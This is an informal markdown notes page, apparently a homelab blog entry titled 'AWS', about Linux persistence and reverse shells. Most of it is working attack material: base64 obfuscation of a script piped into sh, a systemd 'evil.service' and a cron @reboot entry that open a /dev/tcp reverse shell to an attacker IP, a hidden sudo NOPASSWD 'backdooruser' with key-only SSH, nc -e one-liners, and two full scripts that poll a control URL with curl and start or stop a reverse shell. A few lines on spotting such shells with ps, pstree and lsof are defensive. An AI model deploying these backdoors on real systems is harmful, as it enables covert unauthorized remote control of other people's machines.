---
title: AWS 
date: 2023-08-01
tags: [networking,homelab]
---

obsfucation :

origin is the actual script 

```
echo "echo $(base64 origin)" > obsf
chmod +x obsf
```

Running it 
```
sh obsf | base64 -d | sh
```

### Abusing Remote Access Without a Visible Session

`ssh user@host 'sudo apt install backdoor && systemctl enable backdoor'` 

you can catch it from 

`journalctl -u ssh`

### Dropping a systemd service 

Example evil service 

open a reverse shell
```
# /etc/systemd/system/evil.service
[Unit]
Description=Evil Backdoor Service
After=network.target

[Service]
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
```

### cron stuff 

```
@reboot root /usr/bin/evil_payload
```

## Shell stuff

### Reverse shell 

#### how do you find a shell ? 

Use ps to look for shells with no tty 

`ps -eo pid,user,tty,cmd | grep '[b]ash'`

Then check the parent process with 

`pstree -p <PID>`

you can also use 

`ps aux | grep bash`

*** Ussing lsof to see established connections  :- ***

`sudo lsof -i -nP | grep ESTABLISHED`

Start a shell 

```
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```
#### Disable root login

`PermitRootLogin no`

#### starting a reverse shell 

- we need to create an account first that only uses keys

Name it something like *** sysuser *** 

```
sudo adduser backdooruser
sudo usermod -aG sudo backdooruser

sudo visudo
backdooruser ALL=(ALL) NOPASSWD:ALL
```
NOPASSWD helpful for running sudo commands without sudo being prompted 

- setup ssh login 

```
ssh-keygen -t rsa -b 4096

sudo su - backdooruser
mkdir -p ~/.ssh
nano ~/.ssh/authorized_keys 
```

and paste your public key 

expected permissions 

```
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```


- Disable password login

```
sudo nano /etc/ssh/sshd_config
Match User backdooruser
    PasswordAuthentication no
    AuthenticationMethods publickey
``` 

then 

`sudo systemctl restart sshd`


- 2 ways to do a revshell 

```
bash -i >& /dev/tcp/attacker-ip/4242 0>&1
nc ATTACKER_IP 4444 -e /bin/bash
```

prefer to use tcp so that you can disable nc 

Script with nc 

```
#!/bin/bash

# CONFIGURATION
URL="https://rasenrhino.github.io/static/reverse.html"  # Control server
SHELL_HOST="YOUR.ATTACKER.IP.HERE"                      # Replace with your attacker's IP
SHELL_PORT=4444                                          # Port your listener is using

# Function to start reverse shell
start_shell() {
    echo "[*] Starting reverse shell..."
    nohup nc $SHELL_HOST $SHELL_PORT -e /bin/bash &>/dev/null &
}

# Function to stop reverse shell
stop_shell() {
    echo "[*] Killing reverse shell..."
    pkill -f "nc $SHELL_HOST $SHELL_PORT"
}

# Loop to check the control server
while true; do
    response=$(curl -s "$URL")

    if [[ "$response" == "yes" ]]; then
        if ! pgrep -f "nc $SHELL_HOST $SHELL_PORT" >/dev/null; then
            start_shell
        fi
    elif [[ "$response" == "no" ]]; then
        if pgrep -f "nc $SHELL_HOST $SHELL_PORT" >/dev/null; then
            stop_shell
        fi
    else
        echo "[!] Unexpected response from server: $response"
    fi

    sleep 10
done
```

Script with tcp 

```
#!/bin/bash

# CONFIGURATION
URL="https://rasenrhino.github.io/static/reverse.html"  # Control server
SHELL_HOST="YOUR.ATTACKER.IP.HERE"                      # Your public IP
SHELL_PORT=4444                                          # Your listener port
SHELL_PID_FILE="/tmp/.bash_tcp_shell.pid"               # To track running shell

# Function to start TCP reverse shell
start_shell() {
    echo "[*] Starting TCP reverse shell..."
    bash -c "
        exec 3<>/dev/tcp/$SHELL_HOST/$SHELL_PORT
        while true; do
            if ! read -r cmd <&3; then break; fi
            out=\$(eval \"\$cmd\" 2>&1)
            echo \"\$out\" >&3
        done
    " &
    echo $! > "$SHELL_PID_FILE"
}

# Function to stop the TCP reverse shell
stop_shell() {
    echo "[*] Killing TCP reverse shell..."
    if [[ -f "$SHELL_PID_FILE" ]]; then
        kill "$(cat $SHELL_PID_FILE)" 2>/dev/null
        rm -f "$SHELL_PID_FILE"
    fi
}

# Loop to poll control server
while true; do
    response=$(curl -s "$URL")

    if [[ "$response" == "yes" ]]; then
        if [[ ! -f "$SHELL_PID_FILE" ]] || ! kill -0 "$(cat $SHELL_PID_FILE)" 2>/dev/null; then
            start_shell
        fi
    elif [[ "$response" == "no" ]]; then
        if [[ -f "$SHELL_PID_FILE" ]]; then
            stop_shell
        fi
    else
        echo "[!] Unexpected response: $response"
    fi

    sleep 10
done
```